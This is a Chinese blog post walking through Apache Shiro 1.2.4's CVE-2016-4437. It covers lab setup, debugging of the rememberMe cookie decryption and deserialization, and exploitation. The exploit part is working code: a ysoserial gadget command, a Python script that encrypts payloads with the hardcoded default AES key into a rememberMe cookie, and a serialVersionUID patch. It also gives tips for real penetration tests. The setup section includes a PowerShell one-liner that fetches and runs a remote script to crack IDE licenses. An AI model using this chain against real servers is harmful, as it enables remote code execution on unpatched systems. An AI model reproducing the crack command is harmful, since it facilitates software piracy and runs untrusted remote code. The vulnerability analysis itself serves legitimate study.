---
title: 代码审计 | Shiro-550 —— CVE-2016-4437 环境搭建 调试分析 漏洞利用
cover: >-
  https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/4be92b3db6ac15fcd8504230e3168f2b.jpg
categories:
  - [代码审计, shiro]
tags:
  - 代码审计
  - Java
  - Shiro
  - 反序列化
  - CVE-2016-4437
abbrlink: a7f3c8e2
date: 2026-04-07 16:30:00
---

## 目录

- [环境搭建](#环境搭建)
  - [vulhub 快速复现](#vulhub-快速复现)
  - [shiro-root-1.2.4 源码调试环境](#shiro-root-124-源码调试环境)
- [抓包观察 RememberMe Cookie](#抓包观察-rememberme-cookie)
- [源码调试分析](#源码调试分析)
  - [Cookie 获取流程](#cookie-获取流程)
  - [解密逻辑](#解密逻辑)
  - [反序列化触发点](#反序列化触发点)
  - [硬编码 Key 的问题](#硬编码-key-的问题)
- [加密结构梳理](#加密结构梳理)
- [漏洞利用](#漏洞利用)
  - [踩坑一：版本不匹配](#踩坑一版本不匹配)
  - [踩坑二：ClassLoader 问题](#踩坑二classloader-问题)
  - [最终打通](#最终打通)
- [总结](#总结)

---

## 环境搭建

### vulhub 快速复现

先用 vulhub 把环境跑起来，工具直接一把梭爆破确认漏洞存在：

```bash
git clone https://github.com/vulhub/vulhub.git
cd vulhub/shiro/CVE-2016-4437
docker-compose up -d
```

访问 `http://your-ip:8080`

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image1.png)

用工具爆破一下：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image2.png)

找到利用链，命令执行成功：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image3.png)

---

### shiro-root-1.2.4 源码调试环境

想深入分析的话光靠 vulhub 不够，还是得把源码环境搭起来方便打断点。

#### 拉源码切版本

```bash
git clone https://github.com/apache/shiro.git
cd shiro
git checkout shiro-root-1.2.4   # 切到漏洞版本
git describe --tags              # 验证，输出: shiro-root-1.2.4
```

#### IDEA 全家桶破解

```
命令：irm ckey.run/debug | iex
网站：https://ckey.run/
```

#### 配置 Tomcat 启动项目

配置 Tomcat 启动项：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image4.png)

Tomcat 本地（免费版没有这个功能）：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image5.png)

Tomcat 下载地址：https://tomcat.apache.org/download-90.cgi

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image6.png)

解压后配置刚刚的源码路径：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image7.png)

配置工件：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image8.png)

这里顺便说一下 war 和 war exploded 的区别：

- **war** —— 把整个项目打包成一个 `.war` 文件再部署，每次改代码都要重新打包，慢
- **war exploded** —— 直接用解压后的目录结构部署，改了 JSP/class 文件可以热更新，不用重启，调试方便

所以调试的时候选 war exploded 就行了。

#### 解决源码构建的坑

这个版本搭建还是挺麻烦的，有几个问题需要处理。

**换阿里云源解决 SSL 连接问题**，编辑 `C:\Users\t\.m2\settings.xml`：

```xml
<settings>
  <mirrors>
    <mirror>
      <id>aliyun</id>
      <mirrorOf>central</mirrorOf>
      <name>阿里云</name>
      <url>https://maven.aliyun.com/repository/public</url>
    </mirror>
  </mirrors>
</settings>
```

**原项目需要 JDK 1.6，这里用 toolchains 把目标强制指向 8u65**，编辑 `C:\Users\t\.m2\toolchains.xml`：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<toolchains>
  <toolchain>
    <type>jdk</type>
    <provides>
      <vendor>sun</vendor>
      <version>1.6</version>
    </provides>
    <configuration>
      <jdkHome>E:\Java8u65\jdk1.8.0_65</jdkHome>
    </configuration>
  </toolchain>
</toolchains>
```

**改环境变量：**

```powershell
$env:JAVA_HOME = "E:\Java8u65\jdk1.8.0_65"
```

**Maven 安装命令：**

```bash
mvn install "-DskipTests" "-pl" "core,web,samples/web" "-am"
```

没有报错后启动 Tomcat，访问：

```
http://localhost:8080/samples_web_war_exploded/login.jsp
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image9.png)

成功启动了。

---

## 抓包观察 RememberMe Cookie

用 Burp 抓包，对比勾选和不勾选 Remember Me 的请求。

**勾选 Remember Me：**

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image10.png)

**没有勾选：**

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image11.png)

区别在于发包时有没有 `rememberMe=on` 参数（Cookie 里的值才是重点）。

看响应包的 `Set-Cookie`：

**勾选的（第一个包）：**
- 先发一个 `rememberMe=deleteMe`（清除旧 cookie）
- 再发一个有效期 1 年的长串 Base64 → 这就是加密后的序列化数据

**没勾选的（第二个包）：**
- 只有 `rememberMe=deleteMe`，什么都没写入

把第一个包的 rememberMe 值拿来解码分析一下，用 Python：

```python
import base64

cookie = "RszL9pcZFVg8UmvGm2NTBB9dL54WT8SKoFxjOUewM8PYe8UHZ/Rw53xXYdSbL8tDsw1WB8kfzUuFKf+7UXq5m00YoMMy8y57ViSb2VECYmKbQLPgebJUC3v4HlMg5GlkW9f3Q9Tb0o+EXqsJ1xUECpedFcHAMN5BgQhTQ7PQZBpNpdV/YF4EogJdJ6a6n+5DLtYYoD7mpRYZalwDXImSBUUeeQiTZ9tahGLGmzNqvlLzbEW1Gh49G0SFVgn+EW++bJYjfLHqdTvHu27LbMC2nXegrsJHqQeUvqiOBid6ta1GN3EckJWWwgO8dCQPg+rq5/pNJONSWzdEswCnSrmA7WL5Eih3go0jj1OdXiBwhq5lgpym/1Cqm+srRiDfjJNIVvqnmP2sNQGOOg7SNfx3gXg4KnrlDcSZV/FiHGzNpVBe0XuuedTcnYrHDhizp3bHs9cXX6p40Hlp8ph0kU0fyeXpYr1DgdXOTUVHeAM1UhwHZ0T1P45z92b/RNz6GoOd"

data = base64.b64decode(cookie)

print(f"总长度: {len(data)} 字节")
print(f"前16字节(IV): {data[:16].hex()}")
print(f"后续数据前8字节: {data[16:24].hex()}")
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image12.png)

输出：

```
总长度: 384 字节
前16字节(IV): 46cccbf6971915583c526bc69b635304
后续数据前8字节: 1f5d2f9e164fc48a
```

结构一目了然：

```
[ 前16字节 IV ] + [ 后368字节 AES-CBC 加密的序列化数据 ]
```

IV 是每次随机生成的，所以每次登录 cookie 都不一样。

---

## 源码调试分析

### Cookie 获取流程

在 `AbstractRememberMeManager.java` 打两个断点：

**断点1：** `getRememberedPrincipals`

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image13.png)

**断点2：** `deserialize`

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image14.png)

勾选 Remember Me 登录，先来到 `getRememberedPrincipals`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image15.png)

然后进入了 `getRememberedSerializedIdentity` 进行 Base64 的 cookie 获取：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image16.png)

上面这部分大概就是判断是不是 HTTP 请求，是否已经执行过 logout：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image17.png)

接下来就是从 HTTP 请求里读取 rememberMe cookie 的值，如果值是 `deleteMe` 就忽略，这是之前已经标记删除的 cookie：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image18.png)

`ensurePadding` 是处理 Base64 末尾 `=` 号补齐的问题，然后直接 Base64 解码返回字节数组：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image19.png)

base64 正是我们传入的 `Cookie: rememberMe=` 的值：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image20.png)

经过 Base64 `decode` 解码变成了字节返回 `decoded`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image21.png)

然后继续到了 `getRememberedPrincipals` 的 `convertBytesToPrincipals` 方法，传入了刚刚的字节数据：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image22.png)

`convertBytesToPrincipals` 方法非常简单，就两步：

```java
bytes = decrypt(bytes);
return deserialize(bytes);
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image23.png)

### 反序列化触发点

`deserialize(bytes)` 直接反序列化，**没有任何校验**，这就是漏洞的根本原因。

进入 `deserialize` 函数：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image24.png)

直接进入 `deserialize` 看到的是接口，需要从 `getSerializer()` 里开始找。最后找到了 `DefaultSerializer` 里面有 `deserialize` 方法，里面实现了 `readObject`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image25.png)

因此 `deserialize` 只是个壳，里面还是 `readObject`。

`ObjectInputStream.readObject()` 就是 Java 反序列化的触发点，CB 链的 `PriorityQueue.readObject()` 就是从这里开始的。

---

### 解密逻辑

`decrypt` 是一个对字节数据的解密方法：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image26.png)

重点是 `getDecryptionCipherKey()`，key 是怎么来的：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image27.png)

getter 直接返回 `decryptionCipherKey` 的值。找到一个 setter 赋值：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image28.png)

找到是被 `setCipherKey` 调用赋值的是 `cipherKey`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image29.png)

### 硬编码 Key 的问题

继续往上找到 `AbstractRememberMeManager` 构造方法，`DEFAULT_CIPHER_KEY_BYTES` 是硬编码：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image30.png)

最后找到了 `DEFAULT_CIPHER_KEY_BYTES` 就是硬编码的默认 key：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image31.png)

在构造方法里也能看到：

```java
this.cipherService = new AesCipherService();
```

用的是 AES 加密，CBC 模式是 `AesCipherService` 的默认模式。源码：

```java
public AesCipherService() {
    super(ALGORITHM_NAME);
}

private static final String ALGORITHM_NAME = "AES";
```

`JcaCipherService` 的 `generateInitializationVector`，IV 是随机生成的：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image32.png)

`JcaCipherService` 的 `decrypt` 解密逻辑：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image33.png)

```java
int ivByteSize = ivSize / BITS_PER_BYTE; // 128/8 = 16字节

// 前16字节取出来当IV
iv = new byte[ivByteSize];
System.arraycopy(ciphertext, 0, iv, 0, ivByteSize);

// 剩余的才是真正的密文
int encryptedSize = ciphertext.length - ivByteSize;
encrypted = new byte[encryptedSize];
System.arraycopy(ciphertext, ivByteSize, encrypted, 0, encryptedSize);
```

Shiro 加密时把 `IV + 密文` 拼在一起存进 cookie，解密时再按这个格式拆开，这就是我们之前 Python 脚本里 `data[:16]` 取 IV 的依据。

---

## 加密结构梳理

整个流程捋一遍：

```
cookie → Base64解码 → 前16字节=IV，后续=密文 → AES-CBC解密（默认key） → deserialize() 直接反序列化 → RCE
```

漏洞的核心就两点：
1. **Key 硬编码**（`kPH+bIxk5D2deZiIxcaaaA==`），攻击者可以用相同的 key 加密恶意 payload
2. **反序列化没有任何校验**，解密完直接丢给 `readObject()`

---

## 漏洞利用

### 第一步：用 ysoserial 生成序列化 payload

```bash
java -jar ysoserial.jar CommonsBeanutils1 "calc.exe" > payload.ser
```

用 CB1 链，命令是弹计算器验证 RCE。

### 第二步：用 Python 加密后发包

```python
import base64
import os
from Crypto.Cipher import AES

# 读取 ysoserial 生成的 payload
with open("payload.ser", "rb") as f:
    payload = f.read()

# 默认 key
key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")

# 随机生成 IV
iv = os.urandom(16)

# PKCS7 填充
BS = 16
pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()

# AES-CBC 加密
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(pad(payload))

# IV + 密文 → Base64
cookie = base64.b64encode(iv + encrypted).decode()
print(cookie)
```

### 第三步：把生成的 cookie 塞进请求

在 Burp Repeater 里把生成的值替换 rememberMe 的值发包。

---

但是并没有正常弹出计算器，看报错信息：

```
Caused by: java.io.InvalidClassException:
org.apache.commons.beanutils.BeanComparator; local class incompatible:
stream classdesc serialVersionUID = -2044202215314119608, local class serialVersionUID = -3490850999041592962
```

### 踩坑一：版本不匹配

**版本不匹配**，ysoserial 生成 CB1 链时用的是 commons-beanutils **1.9.2**，但 Shiro 1.2.4 自带的是 **1.8.3**，两个版本的 `BeanComparator` `serialVersionUID` 不一样，反序列化时就报错了。

> `serialVersionUID` 是 Java 序列化机制用来验证类版本一致性的标识符，序列化时写进流里，反序列化时拿出来和本地类对比，不一样就直接报 `InvalidClassException`。

ysoserial 好像没有 1.8.3 的链，有两个解决方案：

**方案一：改 Shiro 的依赖版本（最简单）**

在 `samples/web/pom.xml` 加上强制覆盖版本：

```xml
<dependency>
    <groupId>commons-beanutils</groupId>
    <artifactId>commons-beanutils</artifactId>
    <version>1.9.2</version>
</dependency>
```

让 Shiro 用 1.9.2，和 ysoserial 生成的 payload 版本一致，重新 `mvn install` 部署。

**方案二：Python 直接修改 serialVersionUID**

用 Python 把 `payload.ser` 里的 `serialVersionUID` 从 1.9.2 的值替换成 1.8.3 的值：

```python
import struct

with open("payload.ser", "rb") as f:
    data = f.read()

# 1.9.2 的 UID: -2044202215314119608
old_uid = struct.pack(">q", -2044202215314119608)
# 1.8.3 的 UID: -3490850999041592962
new_uid = struct.pack(">q", -3490850999041592962)

data = data.replace(old_uid, new_uid)

with open("payload_183.ser", "wb") as f:
    f.write(data)

print("done")
```

然后用 `payload_183.ser` 重新加密发包。

---

### 踩坑二：ClassLoader 问题

换了方案还是不行，又报错了：

```
2026-04-07 14:18:16,889 TRACE [org.apache.shiro.util.ClassUtils]:
Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator]
from the thread context ClassLoader. Trying the current ClassLoader...
```

这次是 ClassLoader 问题。CB 链依赖了 `commons-collections`，但 Shiro 的 `WebappClassLoader` 找不到它。

Shiro 重写了 `ClassResolvingObjectInputStream.resolveClass()`：

```java
// 源码在 core/src/main/java/org/apache/shiro/io/ClassResolvingObjectInputStream.java
protected Class<?> resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException {
    try {
        return ClassUtils.forName(osc.getName());
    } catch (UnknownClassException e) {
        throw new ClassNotFoundException("Unable to load ObjectStreamClass ...");
    }
}
```

`ClassUtils.forName()` 用的是 Shiro 自己的类加载器，而不是 JDK 默认的 `AppClassLoader`，导致即使 war 包里有 `commons-collections`，也可能加载不到 CC 链里的某些类。

所以需要 NOCC 版本 —— 不依赖 Commons Collections 的 CB 链。

换了这个工具：https://github.com/Y4er/ysoserial/releases

```bash
java -jar .\ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils183NOCC "calc.exe" > payload.ser
```

### 最终打通

这次成功弹出了计算器：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/shiro_image34.png)

完整利用链：

```
ysoserial 生成 CB183NOCC payload
    ↓
Python AES-CBC 加密（key=kPH+bIxk5D2deZiIxcaaaA==）
    ↓
Base64 编码塞进 rememberMe cookie
    ↓
Shiro 取出 cookie → Base64解码 → AES解密 → deserialize()
    ↓
CB链触发 → Runtime.exec("calc.exe") → RCE
```

---

## 总结

**漏洞根本原因：**

1. Shiro 1.2.4 的 rememberMe 功能用 AES-CBC 加密序列化数据存 cookie，但 **key 是硬编码的默认值** `kPH+bIxk5D2deZiIxcaaaA==`，任何人都能用这个 key 加密自己的 payload
2. 解密后直接调用 `ObjectInputStream.readObject()` 反序列化，**没有任何类白名单校验**，一把进 RCE

**打 Shiro 的链选择优先级：**

1. **CB183NOCC** —— 只依赖 JDK 自带类，不受 Shiro ClassLoader 限制，最稳
2. **CB1** —— 需要 commons-beanutils 1.9.2 且版本匹配，需要额外处理
3. **CC 链** —— 受 ClassLoader 限制，不稳定，不推荐

**实际渗透时**，工具（ShiroAttack2、shirogui 等）基本上是自动爆破 key 然后挂链，原理就是这样。理解了加密结构之后，自己手动复现一遍还是挺有意思的，踩的坑也都是实际打时会遇到的问题。
